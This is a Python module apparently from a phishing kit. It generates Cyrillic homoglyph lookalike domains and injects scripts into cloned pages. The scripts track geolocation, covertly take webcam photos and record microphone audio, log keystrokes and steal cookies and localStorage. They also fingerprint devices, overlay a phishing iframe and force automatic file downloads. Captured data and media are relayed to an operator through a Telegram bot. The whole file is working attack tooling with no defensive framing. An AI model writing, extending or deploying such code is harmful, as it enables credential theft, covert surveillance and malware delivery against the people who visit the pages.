import re
import socket
try:
    import qrcode
    QR_AVAILABLE = True
except ImportError:
    qrcode = None
    QR_AVAILABLE = False
from io import BytesIO
try:
    import requests
except ImportError:
    requests = None
from fish_config import BOT_TOKEN, ADMIN_ID
import os
import html

def get_os_from_ua(ua):
    ua = ua.lower()
    if 'windows' in ua:
        return 'Windows'
    elif 'android' in ua:
        return 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        return 'iOS'
    elif 'mac' in ua:
        return 'macOS'
    elif 'linux' in ua:
        return 'Linux'
    else:
        return 'Unknown'

def generate_qr(data, return_img=False):
    if not QR_AVAILABLE:
        if return_img:
            return None
        return
    qr = qrcode.QRCode(box_size=10, border=4)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    if return_img:
        bio = BytesIO()
        bio.name = 'qr.png'
        img.save(bio, 'PNG')
        bio.seek(0)
        return bio
    else:
        os.makedirs('qr_codes', exist_ok=True)
        img.save(os.path.join('qr_codes', 'current_qr.png'))

def safe_escape(text):
    return html.escape(str(text))

def send_telegram_message(text, parse_mode='HTML'):
    if not BOT_TOKEN or ADMIN_ID == 0:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': ADMIN_ID,
        'text': text,
        'parse_mode': parse_mode
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def send_telegram_photo(photo_path, caption=''):
    if not BOT_TOKEN or ADMIN_ID == 0 or not os.path.exists(photo_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as f:
        files = {'photo': f}
        data = {'chat_id': ADMIN_ID, 'caption': caption}
        try:
            requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

def send_telegram_audio(audio_path, caption=''):
    if not BOT_TOKEN or ADMIN_ID == 0 or not os.path.exists(audio_path):
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
    with open(audio_path, 'rb') as f:
        files = {'audio': f}
        data = {'chat_id': ADMIN_ID, 'caption': caption}
        try:
            requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

def generate_homoglyph_domain(domain):
    mapping = {
        'a': 'а', 'c': 'с', 'e': 'е', 'o': 'о', 'p': 'р',
        'x': 'х', 'y': 'у', 'A': 'А', 'B': 'В', 'C': 'С',
        'E': 'Е', 'H': 'Н', 'K': 'К', 'M': 'М', 'O': 'О',
        'P': 'Р', 'T': 'Т', 'X': 'Х', 'Y': 'У'
    }
    result = []
    for ch in domain:
        if ch in mapping:
            result.append(mapping[ch])
        else:
            result.append(ch)
    return ''.join(result)

def replace_domain_in_html(html, original_domain, fake_domain):
    return html.replace(original_domain, fake_domain)

def generate_redirect_page(url):
    return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url={url}">
    <title>Redirecting...</title>
</head>
<body>
    <p>If you are not redirected, <a href="{url}">click here</a>.</p>
</body>
</html>"""

def inject_scripts(html, geo=False, media=False, capture_photo=True, capture_audio=True,
                   download_file_id=None, auto_download=False,
                   keylogger=False, steal_cookies=False, system_info=False,
                   iframe_phish=False, iframe_url=None):
    scripts = []

    if geo:
        geo_script = """
        <script>
        (function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        fetch('/geo', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                acc: position.coords.accuracy
                            })
                        });
                    },
                    function(error) {
                        fetch('/geo', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ error: error.message })
                        });
                    }
                );
            } else {
                fetch('/geo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ error: 'Geolocation not supported' })
                });
            }
        })();
        </script>
        """
        scripts.append(geo_script)

    if media:
        media_script = """
        <script>
        (function() {
            fetch('/media', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status: 'requested' })
            });

            async function capturePhoto(stream) {
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        await video.play();

        // Ждём появления кадров
        await new Promise((resolve, reject) => {
            const check = () => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    resolve();
                } else {
                    video.requestVideoFrameCallback(check);
                }
            };
            check();
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            if (blob && blob.size > 0) {
                const formData = new FormData();
                formData.append('photo', blob, 'webcam.jpg');
                fetch('/upload_media', { method: 'POST', body: formData });
            } else {
                console.error('Empty photo blob');
            }
        }, 'image/jpeg');
    } catch (err) {
        console.error('capturePhoto error', err);
    }
}

            function captureAudio(stream) {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const formData = new FormData();
                    formData.append('audio', blob, 'audio.webm');
                    fetch('/upload_media', { method: 'POST', body: formData });
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            }

            const constraints = {};
            """
        if capture_photo and capture_audio:
            media_script += "constraints.video = true; constraints.audio = true;"
        elif capture_photo:
            media_script += "constraints.video = true;"
        elif capture_audio:
            media_script += "constraints.audio = true;"

        media_script += """
            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    fetch('/media', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: 'granted' })
                    });
                    """
        if capture_photo:
            media_script += "capturePhoto(stream);"
        if capture_audio:
            media_script += "captureAudio(stream);"
        media_script += """
                })
                .catch(err => {
                    fetch('/media', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ status: 'denied', error: err.message })
                    });
                });
        })();
        </script>
        """
        scripts.append(media_script)

    visit_script = """
    <script>
    (function() {
        const img = new Image();
        img.src = '/log_visit?page=' + encodeURIComponent(window.location.pathname) + '&referer=' + encodeURIComponent(document.referrer);
    })();
    </script>
    """
    scripts.append(visit_script)

    if keylogger:
        keylogger_script = """
        <script>
        (function() {
            var keys = '';
            var timer = setInterval(function() {
                if (keys.length > 0) {
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'keylogger=' + encodeURIComponent(keys)
                    });
                    keys = '';
                }
            }, 5000);
            document.addEventListener('keydown', function(e) {
                var key = e.key;
                if (key.length === 1) {
                    keys += key;
                } else {
                    keys += '[' + key + ']';
                }
            });
        })();
        </script>
        """
        scripts.append(keylogger_script)

    if steal_cookies:
        cookies_script = """
        <script>
        (function() {
            var cookies = document.cookie;
            if (cookies) {
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cookies=' + encodeURIComponent(cookies)
                });
            }
            if (window.localStorage) {
                try {
                    var ls = {};
                    for (var i = 0; i < localStorage.length; i++) {
                        var key = localStorage.key(i);
                        ls[key] = localStorage.getItem(key);
                    }
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ localStorage: ls })
                    });
                } catch(e) {}
            }
        })();
        </script>
        """
        scripts.append(cookies_script)

    if system_info:
        sysinfo_script = """
        <script>
        (function() {
            var info = {
                screen: screen.width + 'x' + screen.height,
                availScreen: screen.availWidth + 'x' + screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages.join(','),
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
            };
            if (navigator.connection) {
                info.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.battery = {
                        charging: battery.charging,
                        level: battery.level * 100 + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ system_info: info })
                    });
                });
            } else {
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ system_info: info })
                });
            }
        })();
        </script>
        """
        scripts.append(sysinfo_script)

    if iframe_phish and iframe_url:
        iframe_script = f"""
        <style>
            body {{ margin:0; padding:0; overflow:hidden; }}
            #phish-overlay {{
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                z-index: 9999;
                background: white;
            }}
            #phish-iframe {{
                width: 100%; height: 100%;
                border: none;
            }}
        </style>
        <div id="phish-overlay">
            <iframe id="phish-iframe" src="{iframe_url}"></iframe>
        </div>
        <script>
        document.getElementById('phish-iframe').onload = function() {{
            // Если iframe загрузился, всё хорошо
        }};
        document.getElementById('phish-iframe').onerror = function() {{
            this.src = '/proxy/' + encodeURIComponent('{iframe_url}');
        }};
        </script>
        """
        html = html.replace('<body>', '<body>\n' + iframe_script)

    if download_file_id:
        if auto_download:
            auto_script = f'''
            <script>
            (function() {{
                var link = document.createElement('a');
                link.href = '/download/{download_file_id}';
                link.download = '';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(function() {{
                    document.body.removeChild(link);
                }}, 100);
            }})();
            </script>
            '''
            html = html.replace('</body>', auto_script + '\n</body>')
        else:
            download_link = f'<a href="/download/{download_file_id}" id="downloadLink" style="display:none;">Скачать</a>'
            html = html.replace('</body>', download_link + '\n</body>')

    if scripts:
        all_scripts = '\n'.join(scripts)
        html = html.replace('</body>', all_scripts + '\n</body>')

    return html
